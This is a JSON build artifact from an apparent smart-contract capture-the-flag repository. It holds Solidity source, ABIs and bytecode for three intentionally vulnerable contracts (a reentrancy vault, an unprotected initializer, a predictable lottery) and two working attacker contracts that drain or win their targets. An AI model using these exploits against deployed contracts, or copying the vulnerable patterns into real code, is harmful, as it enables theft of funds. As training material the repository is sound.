@@ -1,0 +1,535 @@
+{
+  "repo": "JN13012/smart-contract-ctf",
+  "commit": "17fbf5b072cd74578c09f05a7c781d2cb07f90ec",
+  "contracts": {
+    "Vault": {
+      "file": "Vault.sol",
+      "path": "src/01-Reentrancy/Vault.sol",
+      "abi": [
+        {
+          "type": "function",
+          "name": "balanceOf",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "outputs": [
+            {
+              "name": "amount",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "deposit",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "withdraw",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "event",
+          "name": "Deposited",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "event",
+          "name": "Withdrawn",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "error",
+          "name": "NothingToWithdraw",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "TransferFailed",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "ZeroDeposit",
+          "inputs": []
+        }
+      ],
+      "bytecode": "0x6080604052348015600e575f5ffd5b506102718061001c5f395ff3fe608060405260043610610033575f3560e01c80633ccfd60b1461003757806370a082311461004d578063d0e30db01461008a575b5f5ffd5b348015610042575f5ffd5b5061004b610092565b005b348015610058575f5ffd5b506100786100673660046101e9565b5f6020819052908152604090205481565b60405190815260200160405180910390f35b61004b61016f565b335f90815260208190526040812054908190036100c257604051630686827b60e51b815260040160405180910390fd5b6040515f90339083908381818185875af1925050503d805f8114610101576040519150601f19603f3d011682016040523d82523d5f602084013e610106565b606091505b5050905080610128576040516312171d8360e31b815260040160405180910390fd5b335f818152602081815260408083209290925590518481527f7084f5476618d8e60b11ef0d7d3f06914655adb8793e28ff7f018d4c76d505d5910160405180910390a25050565b345f0361018f576040516356316e8760e01b815260040160405180910390fd5b335f90815260208190526040812080543492906101ad908490610216565b909155505060405134815233907f2da466a7b24304f47e87fa2e1e5a81b9831ce54fec19055ce277ca2f39ba42c49060200160405180910390a2565b5f602082840312156101f9575f5ffd5b81356001600160a01b038116811461020f575f5ffd5b9392505050565b8082018082111561023557634e487b7160e01b5f52601160045260245ffd5b9291505056fea26469706673582212202cbbb02e7a145617bde6ed097652477449db8870007d570023c8fe65ed22ee1264736f6c634300081c0033",
+      "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\nimport {IVault} from \"./IVault.sol\";\n\n/// @title Vault\n/// @author Jérémie Nagi\n/// @notice Users deposit ETH and withdraw their whole balance at any time.\n/// @custom:ctf Level 1. Goal: empty the vault. In withdraw(), what happens first: the payment or the\n/// balance update? And what can a contract do when it receives ETH?\ncontract Vault is IVault {\n    /// @notice What the vault owes each account.\n    mapping(address account => uint256 amount) public balanceOf;\n\n    event Deposited(address indexed account, uint256 amount);\n    event Withdrawn(address indexed account, uint256 amount);\n\n    error ZeroDeposit();\n    error NothingToWithdraw();\n    error TransferFailed();\n\n    /// @notice Adds the ETH sent to the caller's balance.\n    function deposit() external payable override {\n        if (msg.value == 0) revert ZeroDeposit();\n        balanceOf[msg.sender] += msg.value;\n        emit Deposited(msg.sender, msg.value);\n    }\n\n    /// @notice Sends the caller's whole balance back to them.\n    function withdraw() external override {\n        uint256 amount = balanceOf[msg.sender];\n        if (amount == 0) revert NothingToWithdraw();\n\n        (bool sent,) = msg.sender.call{value: amount}(\"\");\n        if (!sent) revert TransferFailed();\n\n        balanceOf[msg.sender] = 0;\n        emit Withdrawn(msg.sender, amount);\n    }\n}\n"
+    },
+    "VaultAttacker": {
+      "file": "VaultAttacker.sol",
+      "path": "src/01-Reentrancy/VaultAttacker.sol",
+      "abi": [
+        {
+          "type": "constructor",
+          "inputs": [
+            {
+              "name": "target",
+              "type": "address",
+              "internalType": "contract IVault"
+            }
+          ],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "receive",
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "attack",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "owner",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "vault",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "address",
+              "internalType": "contract IVault"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "error",
+          "name": "NotOwner",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "PayoutFailed",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "StakeRequired",
+          "inputs": []
+        }
+      ],
+      "bytecode": "0x60c060405234801561000f575f5ffd5b5060405161047738038061047783398101604081905261002e91610043565b6001600160a01b03166080523360a052610070565b5f60208284031215610053575f5ffd5b81516001600160a01b0381168114610069575f5ffd5b9392505050565b60805160a0516103b86100bf5f395f8181610129015281816101ad01526102f201525f818160460152818160720152818160a50152818161018001528181610213015261028301526103b85ff3fe608060405260043610610036575f3560e01c80638da5cb5b146101185780639e5faafc14610167578063fbfa77cf1461016f575f5ffd5b3661011457336001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001614801561009e57505f547f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03163110155b15610112577f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100fb575f5ffd5b505af115801561010d573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b348015610123575f5ffd5b5061014b7f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b03909116815260200160405180910390f35b6101126101a2565b34801561017a575f5ffd5b5061014b7f000000000000000000000000000000000000000000000000000000000000000081565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146101eb576040516330cd747160e01b815260040160405180910390fd5b345f0361020b576040516337c2e99960e21b815260040160405180910390fd5b345f819055507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b15801561026a575f5ffd5b505af115801561027c573d5f5f3e3d5ffd5b50505050507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102d9575f5ffd5b505af11580156102eb573d5f5f3e3d5ffd5b505050505f7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316476040515f6040518083038185875af1925050503d805f8114610358576040519150601f19603f3d011682016040523d82523d5f602084013e61035d565b606091505b505090508061037f57604051630ec6ac4160e21b815260040160405180910390fd5b5056fea2646970667358221220cf98f9ff2cabbca5dd85a5f1ee1cebbcea2854c886c40887d974afdd4a9ef01364736f6c634300081c0033",
+      "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\nimport {IVault} from \"./IVault.sol\";\n\n/// @title VaultAttacker\n/// @author Jérémie Nagi\n/// @notice Deposits a stake in a vault, withdraws it, and withdraws again each time the vault pays.\ncontract VaultAttacker {\n    IVault public immutable vault;\n    address public immutable owner;\n\n    /// @dev Amount deposited, paid back by the vault on each `withdraw`.\n    uint256 private stake;\n\n    error NotOwner();\n    error StakeRequired();\n    error PayoutFailed();\n\n    constructor(IVault target) {\n        vault = target;\n        owner = msg.sender;\n    }\n\n    /// @notice Runs the exploit with the ETH sent as the stake.\n    function attack() external payable {\n        if (msg.sender != owner) revert NotOwner();\n        if (msg.value == 0) revert StakeRequired();\n\n        stake = msg.value;\n        vault.deposit{value: msg.value}();\n        vault.withdraw();\n\n        (bool paid,) = owner.call{value: address(this).balance}(\"\");\n        if (!paid) revert PayoutFailed();\n    }\n\n    /// @dev Runs on every payment: asks again while the vault can still pay a full stake.\n    receive() external payable {\n        if (msg.sender == address(vault) && address(vault).balance >= stake) {\n            vault.withdraw();\n        }\n    }\n}\n"
+    },
+    "SharedWallet": {
+      "file": "SharedWallet.sol",
+      "path": "src/02-AccessControl/SharedWallet.sol",
+      "abi": [
+        {
+          "type": "receive",
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "initialize",
+          "inputs": [
+            {
+              "name": "initialOwner",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "outputs": [],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "function",
+          "name": "owner",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "withdraw",
+          "inputs": [
+            {
+              "name": "to",
+              "type": "address",
+              "internalType": "address payable"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "outputs": [],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "event",
+          "name": "OwnerSet",
+          "inputs": [
+            {
+              "name": "owner",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "event",
+          "name": "Received",
+          "inputs": [
+            {
+              "name": "from",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "event",
+          "name": "Withdrawn",
+          "inputs": [
+            {
+              "name": "to",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "error",
+          "name": "NotOwner",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "TransferFailed",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "ZeroAddress",
+          "inputs": []
+        }
+      ],
+      "bytecode": "0x6080604052348015600e575f5ffd5b506103008061001c5f395ff3fe608060405260043610610036575f3560e01c80638da5cb5b14610076578063c4d66de8146100b0578063f3fef3a3146100d1575f5ffd5b366100725760405134815233907f88a5966d370b9919b20f3e2c13ff65706f196a4e32cc2c12bf57088f885258749060200160405180910390a2005b5f5ffd5b348015610081575f5ffd5b505f54610094906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b3480156100bb575f5ffd5b506100cf6100ca36600461027e565b6100f0565b005b3480156100dc575f5ffd5b506100cf6100eb3660046102a0565b61015e565b6001600160a01b0381166101175760405163d92e233d60e01b815260040160405180910390fd5b5f80546001600160a01b0319166001600160a01b038316908117825560405190917f50146d0e3c60aa1d17a70635b05494f864e86144a2201275021014fbf08bafe291a250565b5f546001600160a01b03163314610188576040516330cd747160e01b815260040160405180910390fd5b6001600160a01b0382166101af5760405163d92e233d60e01b815260040160405180910390fd5b816001600160a01b03167f7084f5476618d8e60b11ef0d7d3f06914655adb8793e28ff7f018d4c76d505d5826040516101ea91815260200190565b60405180910390a25f826001600160a01b0316826040515f6040518083038185875af1925050503d805f811461023b576040519150601f19603f3d011682016040523d82523d5f602084013e610240565b606091505b5050905080610262576040516312171d8360e31b815260040160405180910390fd5b505050565b6001600160a01b038116811461027b575f5ffd5b50565b5f6020828403121561028e575f5ffd5b813561029981610267565b9392505050565b5f5f604083850312156102b1575f5ffd5b82356102bc81610267565b94602093909301359350505056fea26469706673582212207ca69bf8cef9ff063b8302a7de29dfe9e077c51125ff699487bbe319b3488d7564736f6c634300081c0033",
+      "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\n/// @title SharedWallet\n/// @author Jérémie Nagi\n/// @notice A wallet that anyone can fund and only its owner can spend from.\n/// @dev Runs behind a proxy, so the owner is set by `initialize` instead of a constructor.\n/// @custom:ctf Level 2. Goal: become the owner. Who may call initialize(), and how many times?\ncontract SharedWallet {\n    /// @notice The only account allowed to withdraw.\n    address public owner;\n\n    event OwnerSet(address indexed owner);\n    event Received(address indexed from, uint256 amount);\n    event Withdrawn(address indexed to, uint256 amount);\n\n    error NotOwner();\n    error ZeroAddress();\n    error TransferFailed();\n\n    modifier onlyOwner() {\n        if (msg.sender != owner) revert NotOwner();\n        _;\n    }\n\n    /// @notice Sets the owner. Meant to run once, right after deployment.\n    function initialize(address initialOwner) external {\n        if (initialOwner == address(0)) revert ZeroAddress();\n        owner = initialOwner;\n        emit OwnerSet(initialOwner);\n    }\n\n    receive() external payable {\n        emit Received(msg.sender, msg.value);\n    }\n\n    /// @notice Sends `amount` wei from the wallet to `to`.\n    function withdraw(address payable to, uint256 amount) external onlyOwner {\n        if (to == address(0)) revert ZeroAddress();\n        emit Withdrawn(to, amount);\n        (bool sent,) = to.call{value: amount}(\"\");\n        if (!sent) revert TransferFailed();\n    }\n}\n"
+    },
+    "ERC1967Proxy": {
+      "file": "ERC1967Proxy.sol",
+      "path": "lib/openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol",
+      "abi": [
+        {
+          "type": "constructor",
+          "inputs": [
+            {
+              "name": "implementation",
+              "type": "address",
+              "internalType": "address"
+            },
+            {
+              "name": "_data",
+              "type": "bytes",
+              "internalType": "bytes"
+            }
+          ],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "fallback",
+          "stateMutability": "payable"
+        },
+        {
+          "type": "event",
+          "name": "Upgraded",
+          "inputs": [
+            {
+              "name": "implementation",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "error",
+          "name": "AddressEmptyCode",
+          "inputs": [
+            {
+              "name": "target",
+              "type": "address",
+              "internalType": "address"
+            }
+          ]
+        },
+        {
+          "type": "error",
+          "name": "ERC1967InvalidImplementation",
+          "inputs": [
+            {
+              "name": "implementation",
+              "type": "address",
+              "internalType": "address"
+            }
+          ]
+        },
+        {
+          "type": "error",
+          "name": "ERC1967NonPayable",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "ERC1967ProxyUninitialized",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "FailedCall",
+          "inputs": []
+        }
+      ],
+      "bytecode": "0x60806040526040516103b63803806103b683398101604081905261002291610238565b8051610041576040516330a289cf60e21b815260040160405180910390fd5b61004b8282610052565b5050610307565b61005b826100b0565b6040516001600160a01b038316907fbc7cd75a20ee27fd9adebab32041f755214dbc6bffa90cc0225b39da2e5c2d3b905f90a28051156100a45761009f828261012b565b505050565b6100ac6101cc565b5050565b806001600160a01b03163b5f036100ea57604051634c9c8ce360e01b81526001600160a01b03821660048201526024015b60405180910390fd5b7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc80546001600160a01b0319166001600160a01b0392909216919091179055565b60605f61013884846101ed565b905080801561015957505f3d118061015957505f846001600160a01b03163b115b1561016e57610166610200565b9150506101c6565b801561019857604051639996b31560e01b81526001600160a01b03851660048201526024016100e1565b3d156101ab576101a6610219565b6101c4565b60405163d6bda27560e01b815260040160405180910390fd5b505b92915050565b34156101eb5760405163b398979f60e01b815260040160405180910390fd5b565b5f5f5f835160208501865af49392505050565b6040513d81523d5f602083013e3d602001810160405290565b6040513d5f823e3d81fd5b634e487b7160e01b5f52604160045260245ffd5b5f5f60408385031215610249575f5ffd5b82516001600160a01b038116811461025f575f5ffd5b60208401519092506001600160401b0381111561027a575f5ffd5b8301601f8101851361028a575f5ffd5b80516001600160401b038111156102a3576102a3610224565b604051601f8201601f19908116603f011681016001600160401b03811182821017156102d1576102d1610224565b6040528181528282016020018710156102e8575f5ffd5b8160208401602083015e5f602083830101528093505050509250929050565b60a3806103135f395ff3fe6080604052600a600c565b005b60186014601a565b6050565b565b5f604b7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc546001600160a01b031690565b905090565b365f5f375f5f365f845af43d5f5f3e8080156069573d5ff35b3d5ffdfea26469706673582212200418ff976037584bbca751dfbd358442ca7220af93ac821c8367c71822a3475d64736f6c634300081c0033",
+      "source": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.6.0) (proxy/ERC1967/ERC1967Proxy.sol)\n\npragma solidity ^0.8.22;\n\nimport {Proxy} from \"../Proxy.sol\";\nimport {ERC1967Utils} from \"./ERC1967Utils.sol\";\n\n/**\n * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an\n * implementation address that can be changed. This address is stored in storage in the location specified by\n * https://eips.ethereum.org/EIPS/eip-1967[ERC-1967], so that it doesn't conflict with the storage layout of the\n * implementation behind the proxy.\n */\ncontract ERC1967Proxy is Proxy {\n    /**\n     * @dev The proxy is left uninitialized.\n     */\n    error ERC1967ProxyUninitialized();\n\n    /**\n     * @dev Initializes the upgradeable proxy with an initial implementation specified by `implementation`.\n     *\n     * Provided `_data` is passed in a delegate call to `implementation`. This will typically be an encoded function\n     * call, and allows initializing the storage of the proxy like a Solidity constructor. By default construction\n     * will fail if `_data` is empty. This behavior can be overridden using a custom {_unsafeAllowUninitialized} that\n     * returns true. In that case, empty `_data` is ignored and no delegate call to the implementation is performed\n     * during construction.\n     *\n     * Requirements:\n     *\n     * - If `data` is empty, `msg.value` must be zero.\n     */\n    constructor(address implementation, bytes memory _data) payable {\n        if (!_unsafeAllowUninitialized() && _data.length == 0) {\n            revert ERC1967ProxyUninitialized();\n        }\n        ERC1967Utils.upgradeToAndCall(implementation, _data);\n    }\n\n    /**\n     * @dev Returns the current implementation address.\n     *\n     * TIP: To get this value clients can read directly from the storage slot shown below (specified by ERC-1967) using\n     * the https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.\n     * `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`\n     */\n    function _implementation() internal view virtual override returns (address) {\n        return ERC1967Utils.getImplementation();\n    }\n\n    /**\n     * @dev Returns whether the proxy can be left uninitialized.\n     *\n     * NOTE: Override this function to allow the proxy to be left uninitialized.\n     * Consider uninitialized proxies might be susceptible to man-in-the-middle threats\n     * where the proxy is replaced with a malicious one.\n     */\n    function _unsafeAllowUninitialized() internal pure virtual returns (bool) {\n        return false;\n    }\n}\n"
+    },
+    "Lottery": {
+      "file": "Lottery.sol",
+      "path": "src/03-Randomness/Lottery.sol",
+      "abi": [
+        {
+          "type": "constructor",
+          "inputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "RANGE",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "TICKET_PRICE",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "play",
+          "inputs": [
+            {
+              "name": "guess",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "event",
+          "name": "Played",
+          "inputs": [
+            {
+              "name": "player",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "guess",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            },
+            {
+              "name": "winningNumber",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            },
+            {
+              "name": "prize",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "error",
+          "name": "GuessOutOfRange",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "TransferFailed",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "WrongTicketPrice",
+          "inputs": []
+        }
+      ],
+      "bytecode": "0x6080604052610268806100115f395ff3fe608060405260043610610033575f3560e01c80631a95f15f14610037578063621f85f9146100645780636898f82b14610078575b5f5ffd5b348015610042575f5ffd5b5061005267016345785d8a000081565b60405190815260200160405180910390f35b34801561006f575f5ffd5b50610052600a81565b61008b6100863660046101fc565b61008d565b005b67016345785d8a000034146100b55760405163127c5ed960e01b815260040160405180910390fd5b600a81106100d657604051633eea16e760e01b815260040160405180910390fd5b5f6100e0336101ab565b90505f8183146100f0575f6100f2565b475b604080518581526020810185905290810182905290915033907f68c7202a45decf815c2b366df51351accc580243258fedf46ddc86c1c0dd5f2b9060600160405180910390a280156101a6576040515f90339083908381818185875af1925050503d805f811461017d576040519150601f19603f3d011682016040523d82523d5f602084013e610182565b606091505b50509050806101a4576040516312171d8360e31b815260040160405180910390fd5b505b505050565b6040805144602082015242918101919091526001600160a01b03821660608201525f90600a90608001604051602081830303815290604052805190602001205f1c6101f69190610213565b92915050565b5f6020828403121561020c575f5ffd5b5035919050565b5f8261022d57634e487b7160e01b5f52601260045260245ffd5b50069056fea2646970667358221220ac4de8e9979221299e02860467469d55783451d152e6fb70e2aed7560ab70dba64736f6c634300081c0033",
+      "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\nimport {ILottery} from \"./ILottery.sol\";\n\n/// @title Lottery\n/// @author Jérémie Nagi\n/// @notice Pay a ticket, guess a number from 0 to 9, and win the whole pot if the guess is right.\n/// @custom:ctf Level 3. Goal: win the pot with one ticket. Where does the winning number come from,\n/// and who else can read those values in the same block?\ncontract Lottery is ILottery {\n    uint256 public constant TICKET_PRICE = 0.1 ether;\n    /// @notice Guesses go from 0 to RANGE - 1.\n    uint256 public constant RANGE = 10;\n\n    event Played(address indexed player, uint256 guess, uint256 winningNumber, uint256 prize);\n\n    error WrongTicketPrice();\n    error GuessOutOfRange();\n    error TransferFailed();\n\n    /// @notice Deploys the lottery with the ETH sent as its initial pot.\n    constructor() payable {}\n\n    /// @notice Buys a ticket and draws at once: a right guess wins the whole balance.\n    function play(uint256 guess) external payable override {\n        if (msg.value != TICKET_PRICE) revert WrongTicketPrice();\n        if (guess >= RANGE) revert GuessOutOfRange();\n\n        uint256 winningNumber = _draw(msg.sender);\n        uint256 prize = guess == winningNumber ? address(this).balance : 0;\n        emit Played(msg.sender, guess, winningNumber, prize);\n\n        if (prize > 0) {\n            (bool sent,) = msg.sender.call{value: prize}(\"\");\n            if (!sent) revert TransferFailed();\n        }\n    }\n\n    function _draw(address player) internal view returns (uint256) {\n        return uint256(keccak256(abi.encode(block.prevrandao, block.timestamp, player))) % RANGE;\n    }\n}\n"
+    },
+    "LotteryAttacker": {
+      "file": "LotteryAttacker.sol",
+      "path": "src/03-Randomness/LotteryAttacker.sol",
+      "abi": [
+        {
+          "type": "constructor",
+          "inputs": [
+            {
+              "name": "target",
+              "type": "address",
+              "internalType": "contract ILottery"
+            }
+          ],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "receive",
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "attack",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "lottery",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "address",
+              "internalType": "contract ILottery"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "owner",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "error",
+          "name": "NotOwner",
+          "inputs": []
+        },
+        {
+          "type": "error",
+          "name": "PayoutFailed",
+          "inputs": []
+        }
+      ],
+      "bytecode": "0x60c060405234801561000f575f5ffd5b506040516103f93803806103f983398101604081905261002e91610043565b6001600160a01b03166080523360a052610070565b5f60208284031215610053575f5ffd5b81516001600160a01b0381168114610069575f5ffd5b9392505050565b60805160a05161034f6100aa5f395f818160520152818160d8015261025201525f818160ab0152818161011901526101f5015261034f5ff3fe608060405260043610610036575f3560e01c80638da5cb5b146100415780639e5faafc14610090578063ba13a5721461009a575f5ffd5b3661003d57005b5f5ffd5b34801561004c575f5ffd5b506100747f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b03909116815260200160405180910390f35b6100986100cd565b005b3480156100a5575f5ffd5b506100747f000000000000000000000000000000000000000000000000000000000000000081565b336001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001614610116576040516330cd747160e01b815260040160405180910390fd5b5f7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663621f85f96040518163ffffffff1660e01b8152600401602060405180830381865afa158015610173573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061019791906102e3565b604080514460208201524291810191909152306060820152608001604051602081830303815290604052805190602001205f1c6101d491906102fa565b604051636898f82b60e01b8152600481018290529091506001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001690636898f82b9034906024015f604051808303818588803b158015610238575f5ffd5b505af115801561024a573d5f5f3e3d5ffd5b50505050505f7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316476040515f6040518083038185875af1925050503d805f81146102b8576040519150601f19603f3d011682016040523d82523d5f602084013e6102bd565b606091505b50509050806102df57604051630ec6ac4160e21b815260040160405180910390fd5b5050565b5f602082840312156102f3575f5ffd5b5051919050565b5f8261031457634e487b7160e01b5f52601260045260245ffd5b50069056fea2646970667358221220cc7f3878677a737b915ece928a7c8af861a70bc087922b439375975d9fb495aa64736f6c634300081c0033",
+      "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\nimport {ILottery} from \"./ILottery.sol\";\n\n/// @title LotteryAttacker\n/// @author Jérémie Nagi\n/// @notice Computes the lottery's number in the same block as the draw, then plays it.\ncontract LotteryAttacker {\n    ILottery public immutable lottery;\n    address public immutable owner;\n\n    error NotOwner();\n    error PayoutFailed();\n\n    constructor(ILottery target) {\n        lottery = target;\n        owner = msg.sender;\n    }\n\n    /// @notice Plays the number the lottery is about to draw. Send exactly one ticket price.\n    function attack() external payable {\n        if (msg.sender != owner) revert NotOwner();\n\n        uint256 guess = uint256(keccak256(abi.encode(block.prevrandao, block.timestamp, address(this))))\n            % lottery.RANGE();\n        lottery.play{value: msg.value}(guess);\n\n        (bool paid,) = owner.call{value: address(this).balance}(\"\");\n        if (!paid) revert PayoutFailed();\n    }\n\n    /// @dev Receives the prize.\n    receive() external payable {}\n}\n"
+    }
+  }
+}
